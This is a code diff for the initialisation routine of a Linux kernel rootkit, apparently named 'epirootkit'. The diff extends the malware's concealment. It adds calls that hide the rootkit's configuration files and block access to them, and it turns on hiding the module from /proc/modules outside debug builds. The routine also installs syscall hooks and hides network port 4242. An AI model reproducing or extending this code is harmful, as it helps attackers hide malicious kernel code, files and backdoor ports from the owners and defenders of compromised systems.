@@ -9,25 +9,25 @@
 
 int init_interceptor(void) {
     int err;
-    
+
     err = create_dir(HIDDEN_DIR_PATH);
     if (err) {
         ERR_MSG("init: mkdir %s failed: %d\n", HIDDEN_DIR_PATH, err);
         return err;
     }
-    
+
     err = alterate_init();
     if (err) {
         ERR_MSG("init: alterate_init() failed: %d\n", err);
         return err;
     }
-   
+
     err = forbid_init();
     if (err) {
         ERR_MSG("init: forbid_init() failed: %d\n", err);
         return err;
     }
-    
+
     err = hide_init();
     if (err) {
         ERR_MSG("init: hide_init() failed: %d\n", err);
@@ -35,22 +35,30 @@ int init_interceptor(void) {
     }
 
     err = hide_port_init();
-     if (err) {
+    if (err) {
         ERR_MSG("init: hide_port_init() failed: %d\n", err);
         return err;
     }
-    
+
     err = fh_install_hooks(hooks, hook_array_size);
     if (err) {
         ERR_MSG("init: failed to install hooks\n");
         return err;
     }
-    
+
     // Hide directory HIDDEN_DIR_PATH
     hide_file(HIDDEN_DIR_PATH);
+    hide_file(HIDE_CFG_FILE);
+    hide_file(FORBID_CFG_FILE);
+    hide_file(ALTERATE_CFG_FILE);
+    hide_file(HIDE_PORT_CFG_FILE);
 
     // Forbid access to HIDDEN_DIR_PATH
     forbid_file(HIDDEN_DIR_PATH);
+    forbid_file(HIDE_CFG_FILE);
+    forbid_file(FORBID_CFG_FILE);
+    forbid_file(ALTERATE_CFG_FILE);
+    forbid_file(HIDE_PORT_CFG_FILE);
 
     // Hide module in /sys/modules
     hide_file("/sys/module/epirootkit");
@@ -70,8 +78,9 @@ int init_interceptor(void) {
     hide_port("4242");
 
     // Hide module in /proc/modules
-    // hide_module();
-    
+    if (!DEBUG)
+        hide_module();
+
     return SUCCESS;
 }
 
